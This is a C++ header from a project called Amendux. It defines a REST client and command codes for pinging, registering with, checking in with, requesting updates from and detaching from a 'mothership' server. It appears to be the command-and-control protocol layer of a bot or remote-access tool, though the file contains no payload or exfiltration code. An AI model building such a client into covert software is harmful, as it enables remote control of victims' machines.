#pragma once

#include "WebClient.h"
#include "Json.h"

namespace Amendux {

	enum RestClientCommand {
		CM_CLIENT_PING = 101, /* Check if mothership is alive */
		CM_CLIENT_SOLICIT = 200, /* Register boot with mothership */
		CM_CLIENT_CHECKIN = 201, /* Checkin with mothership */
		CM_CLIENT_UPDATE = 202, /* Request update */
		CM_CLIENT_ELIMINATE = 299, /* Detach machine from mothership */
	};

	enum RestServerCommand {
		CM_SERVER_INVALID = 0, /* Command invalid */
		CM_SERVER_PONG = 101, /* Ping server response */
		CM_SERVER_ACK = 900, /* Acknowledge command */
	};

	class RestClient : public WebClient
	{
		RestServerCommand serverCode;
		bool callSuccess = false;

	public:
		RestClient(const std::string& host, const std::string& uri = "") : WebClient(host, uri) {}
		~RestClient() {}

		void *ParseResponse(void *data);

		void *Call(RestClientCommand code, JSONValue *data, bool status = true) {
			JSONObject obj;
			obj[L"data"] = data;
			obj[L"code"] = new JSONValue(static_cast<double>(code));
			obj[L"success"] = new JSONValue(status);

			std::wstring dataObj = L"data=" + JSONValue(obj).Stringify();

			return ParseResponse(Perform(dataObj));
		}

		inline RestServerCommand getServerCode() const {
			return serverCode;
		}

		inline bool Success() const {
			return callSuccess;
		}

	};

}
